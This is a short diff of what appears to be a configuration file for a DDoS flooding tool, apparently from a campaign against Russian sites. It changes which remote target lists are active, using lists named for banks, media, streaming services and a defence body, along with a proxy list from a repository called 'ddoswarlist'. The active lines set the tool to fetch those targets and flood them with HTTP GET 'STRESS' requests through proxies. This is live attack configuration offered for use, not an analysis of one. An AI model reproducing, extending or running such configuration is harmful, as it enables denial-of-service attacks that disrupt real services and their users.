@@ -4,11 +4,12 @@
 #-c https://raw.githubusercontent.com/girador/res/main/1tv.txt --http-methods GET STRESS
 #-c https://raw.githubusercontent.com/girador/res/main/okko.txt --http-methods GET STRESS
 #-c https://raw.githubusercontent.com/girador/res/main/iptv.txt --http-methods GET STRESS
-#-c https://raw.githubusercontent.com/girador/res/main/it_army.txt --http-methods GET STRESS
+#
 #-c https://raw.githubusercontent.com/girador/res/main/crpt.txt --http-methods GET STRESS
 #-c https://raw.githubusercontent.com/girador/res/main/amediateka.txt --http-methods GET STRESS
-#-c https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/girador/res/main/sber.txt --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/girador/res/main/ter_oborona.txt  --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/girador/res/main/ter_oborona.txt  --http-methods GET STRESS
+-c https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --http-methods GET STRESS
 -c https://cdn.uashield.cc/sites.txt --http-methods GET STRESS --http-methods GET STRESS --proxies https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies/proxy.txt
--c https://raw.githubusercontent.com/girador/res/main/sber.txt --http-methods GET STRESS
+-c https://raw.githubusercontent.com/girador/res/main/it_army.txt --http-methods GET STRESS
